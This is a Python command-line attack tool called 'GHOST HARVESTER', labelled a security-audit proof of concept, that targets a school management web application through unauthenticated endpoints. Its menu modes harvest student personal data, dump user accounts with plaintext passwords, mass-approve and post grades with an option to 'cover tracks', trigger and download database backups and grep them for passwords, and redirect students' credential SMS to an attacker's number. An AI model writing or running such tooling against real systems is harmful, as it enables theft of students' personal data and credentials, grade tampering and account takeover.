import sys
import json
import time
import requests

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"
1
# ── banner ────────────────────────────────────────────────────────────────────

def _build_banner():
    title_lines_raw = [
        " _____ _  _  ___  ____  _____ ",
        "|  __ \\ || |/ _ \\/ ___||_   _|",
        "| |  \\/ \\| | | | \\___ \\  | |  ",
        "| |  | |\\  | |_| |___) | | |  ",
        "|_|  |_| \\_|\\___/|____/  |_|  ",
    ]
    title_lines = [f"{DIM}{l}{RESET}" for l in title_lines_raw]

    art = [
        f"   {DIM}░░░░░░░░░░░░░░░░░{RESET}",
        f"   {DIM}░{RESET} {YELLOW}👻{RESET} {CYAN}GHOST HARVESTER{RESET} {DIM}░{RESET}",
        f"   {DIM}░{RESET}  {DIM}unauth data dump{RESET}  {DIM}░{RESET}",
        f"   {DIM}░{RESET}  {GREEN}PII · creds · grades{RESET} {DIM}░{RESET}",
        f"   {DIM}░░░░░░░░░░░░░░░░░{RESET}",
    ]

    T = max(len(l) for l in title_lines_raw)
    top_pad    = [""] * 2
    bot_pad    = [""] * 2
    left_lines = top_pad + [f"{l}{' ' * (T - len(r))}" for l, r in zip(title_lines, title_lines_raw)] + bot_pad
    right_lines = [""] * 2 + art + [""] * 1

    out = ["\n"]
    for l, r in zip(left_lines, right_lines):
        out.append(f"  {l}   {r}")
    out.append(f"\n  {DIM}  unauthenticated harvester  ·  SUPERADMIN / SECURITY_AUDIT POC{RESET}\n")
    return "\n".join(out)

print(_build_banner())

# ── menu helpers ──────────────────────────────────────────────────────────────

MODES = [
    (YELLOW,  "Student PII Harvest       (contactnumber/list — no auth)"),
    (RED,     "User credential dump      (cloudNewData/users/0 — no auth)"),
    (MAGENTA, "Grade mass approve + post (reportcard/grade/status — no auth)"),
    (CYAN,    "Trigger DB backup         (/backupdb — no auth)"),
    (CYAN,    "Download backup file      (public/dbbackup/{filename})"),
    (GREEN,   "Update any student contact number (contactnumber/update)"),
]

def print_menu():
    print(f"\n  {DIM}┌{'─' * 60}┐{RESET}")
    for i, (color, desc) in enumerate(MODES, 1):
        pad = " " * (58 - len(desc))
        print(f"  {DIM}│{RESET}  {color}[{i}]{RESET} {desc}{pad}{DIM}│{RESET}")
    print(f"  {DIM}│{RESET}  {RED}[0]{RESET} Exit{' ' * 53}{DIM}│{RESET}")
    print(f"  {DIM}└{'─' * 60}┘{RESET}")

# ── inputs ────────────────────────────────────────────────────────────────────

try:
    BASE_URL = input(f"  {CYAN}[?]{RESET} Target URL         : ").strip().rstrip("/")
    SY_ID    = input(f"  {CYAN}[?]{RESET} School Year ID [1] : ").strip() or "1"
except KeyboardInterrupt:
    print(f"\n\n  {YELLOW}[!]{RESET} Aborted.")
    raise SystemExit(0)

HDRS = {"X-Requested-With": "XMLHttpRequest"}

def _get(path, params=None, session_cookie=None):
    h = dict(HDRS)
    if session_cookie:
        h["Cookie"] = f"laravel_session={session_cookie}"
    try:
        r = requests.get(f"{BASE_URL}{path}", params=params, headers=h, timeout=10)
        return r
    except Exception as e:
        print(f"  {RED}[!]{RESET} {e}")
        return None

# ── main loop ─────────────────────────────────────────────────────────────────

while True:
    print_menu()
    try:
        choice = input(
            f"  {DIM}┌─[{RESET}{DIM}ghost{RESET}{DIM}@{RESET}{YELLOW}unauth{RESET}{DIM}]─[~]{RESET}\n"
            f"  {DIM}└──╼{RESET} {GREEN}${RESET} "
        ).strip()
    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}[!]{RESET} Exiting.\n")
        sys.exit(0)

    if choice == "0":
        print(f"\n  {YELLOW}[!]{RESET} Exiting.\n")
        sys.exit(0)

    elif choice == "1":
        # Unauthenticated student PII harvest
        try:
            level_id = input(f"  {CYAN}[?]{RESET} Level ID     [blank=all]: ").strip()
            sem_id   = input(f"  {CYAN}[?]{RESET} Semester ID  [blank=all]: ").strip()
            status   = input(f"  {CYAN}[?]{RESET} Student status [all]    : ").strip() or "all"
        except KeyboardInterrupt:
            continue
        params = {"syid": SY_ID, "levelid": level_id, "semid": sem_id, "studentstatus": status}
        print(f"\n  {DIM}[>]{RESET} GET /student/contactnumber/list")
        r = _get("/student/contactnumber/list", params=params)
        if r is None: continue
        sc = GREEN if r.status_code < 300 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}  ({len(r.content)} bytes)")
        try:
            data = r.json()
            if not data:
                print(f"  {YELLOW}[!]{RESET} Empty response.")
                continue
            print(f"  {GREEN}[+]{RESET} {len(data)} student records\n")
            print(f"  {CYAN}{'SID':<12} {'Name':<30} {'Contact':<15} {'Address'}{RESET}")
            print(f"  {DIM}{'─'*80}{RESET}")
            for s in data[:30]:
                sid     = str(s.get("sid",""))[:11]
                name    = f"{s.get('lastname','')} {s.get('firstname','')}".strip()[:29]
                contact = str(s.get("contactno","") or s.get("mcontactno",""))[:14]
                addr    = f"{s.get('barangay','')} {s.get('city','')}".strip()[:30]
                print(f"  {sid:<12} {name:<30} {YELLOW}{contact:<15}{RESET} {DIM}{addr}{RESET}")
            if len(data) > 30:
                print(f"\n  {DIM}... {len(data)-30} more — see ghost_pii.json{RESET}")
            out = "ghost_pii.json"
            with open(out, "w") as f:
                json.dump(data, f, indent=2)
            print(f"\n  {GREEN}[✓]{RESET} Saved → {CYAN}{out}{RESET}")
        except Exception:
            print(f"  {DIM}{r.text[:400]}{RESET}")

    elif choice == "2":
        # cloudNewData/users/0 — plaintext passwords
        print(f"\n  {DIM}[>]{RESET} GET /cloudNewData/users/0")
        r = _get("/cloudNewData/users/0")
        if r is None: continue
        sc = GREEN if r.status_code < 300 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}  ({len(r.content)} bytes)")
        try:
            users = r.json()
            if not users:
                print(f"  {YELLOW}[!]{RESET} Empty — may need auth or different endpoint.")
                continue
            print(f"  {GREEN}[+]{RESET} {len(users)} user records\n")
            found_plain = 0
            print(f"  {CYAN}{'ID':<6} {'Email':<30} {'Type':<6} {'Plaintext PW'}{RESET}")
            print(f"  {DIM}{'─'*65}{RESET}")
            for u in users[:60]:
                uid   = str(u.get("id",""))
                email = str(u.get("email",""))[:29]
                utype = str(u.get("type",""))
                pwstr = str(u.get("passwordstr","") or "")
                if pwstr: found_plain += 1
                color = GREEN if pwstr else DIM
                print(f"  {uid:<6} {email:<30} {utype:<6} {color}{pwstr}{RESET}")
            print(f"\n  {GREEN}[+]{RESET} Plaintext passwords found: {YELLOW}{found_plain}{RESET}")
            out = "ghost_users.json"
            with open(out, "w") as f:
                json.dump(users, f, indent=2)
            print(f"  {GREEN}[✓]{RESET} Saved → {CYAN}{out}{RESET}")
        except Exception:
            print(f"  {DIM}{r.text[:400]}{RESET}")

    elif choice == "3":
        # Unauthenticated grade approve + post
        print(f"\n  {YELLOW}[!]{RESET} This approves and posts {BOLD}ALL{RESET} grades for the target school year.")
        try:
            confirm = input(f"  {RED}[?]{RESET} Proceed? [y/N]: ").strip().lower()
        except KeyboardInterrupt:
            continue
        if confirm != "y":
            continue

        for action in [("approve", "Approving"), ("post", "Posting"), ("pending", "Reset to pending (optional)")]:
            endpoint, label = f"/reportcard/grade/status/{action[0]}", action[1]
            print(f"\n  {DIM}[>]{RESET} {label} → {endpoint}")
            r = _get(endpoint, params={"syid": SY_ID})
            if r is None: continue
            sc = GREEN if r.status_code < 400 else RED
            print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}  {DIM}{r.text[:120]}{RESET}")
            if action[0] == "post":
                try:
                    yn = input(f"  {CYAN}[?]{RESET} Also reset to pending to cover tracks? [y/N]: ").strip().lower()
                    if yn != "y":
                        break
                except KeyboardInterrupt:
                    break

    elif choice == "4":
        # Trigger backup
        print(f"\n  {DIM}[>]{RESET} GET /backupdb  (triggers SQL dump to public/dbbackup/)")
        r = _get("/backupdb")
        if r is None: continue
        sc = GREEN if r.status_code < 400 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}")
        print(f"  {DIM}    Response: {RESET}{r.text[:400]}")
        if r.status_code < 400:
            today = time.strftime("%Y-%m-%d")
            print(f"\n  {GREEN}[+]{RESET} Backup likely at: {CYAN}{BASE_URL}/dbbackup/<dbname> {today}.sql{RESET}")
            print(f"  {DIM}    Use mode 5 to download it.{RESET}")

    elif choice == "5":
        # Download backup file
        try:
            filename = input(f"  {CYAN}[?]{RESET} Backup filename (e.g. es_ldcu 2026-06-06.sql): ").strip()
        except KeyboardInterrupt:
            continue
        url = f"{BASE_URL}/dbbackup/{filename}"
        print(f"\n  {DIM}[>]{RESET} GET {url}")
        try:
            r = requests.get(url, timeout=30)
            sc = GREEN if r.status_code < 300 else RED
            print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}  ({len(r.content)} bytes)")
            if r.status_code == 200:
                safe_name = filename.replace(" ", "_").replace("/","_")
                out = f"ghost_backup_{safe_name}"
                with open(out, "wb") as f:
                    f.write(r.content)
                print(f"  {GREEN}[✓]{RESET} Saved → {CYAN}{out}{RESET}")
                # quick grep for passwords
                text = r.content.decode("utf-8", errors="replace")
                lines = [l for l in text.splitlines() if "passwordstr" in l.lower() or "INSERT INTO `users`" in l]
                if lines:
                    print(f"\n  {YELLOW}[+]{RESET} Password-related lines ({len(lines)}):")
                    for l in lines[:10]:
                        print(f"  {DIM}    {l[:120]}{RESET}")
            else:
                print(f"  {DIM}{r.text[:300]}{RESET}")
        except Exception as e:
            print(f"  {RED}[!]{RESET} {e}")

    elif choice == "6":
        # Update any student's contact number (for SMS redirect)
        print(f"\n  {YELLOW}[!]{RESET} Redirects credential SMS to attacker-controlled number.")
        try:
            stud_id = input(f"  {CYAN}[?]{RESET} Target studid : ").strip()
            new_num = input(f"  {CYAN}[?]{RESET} New contact # : ").strip()
        except KeyboardInterrupt:
            continue
        print(f"\n  {DIM}[>]{RESET} GET /student/contactnumber/update")
        r = _get("/student/contactnumber/update", params={"studid": stud_id, "contactno": new_num})
        if r is None: continue
        sc = GREEN if r.status_code < 300 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}")
        print(f"  {DIM}    {r.text[:200]}{RESET}")

    else:
        print(f"\n  {RED}[!]{RESET} Invalid choice.\n")
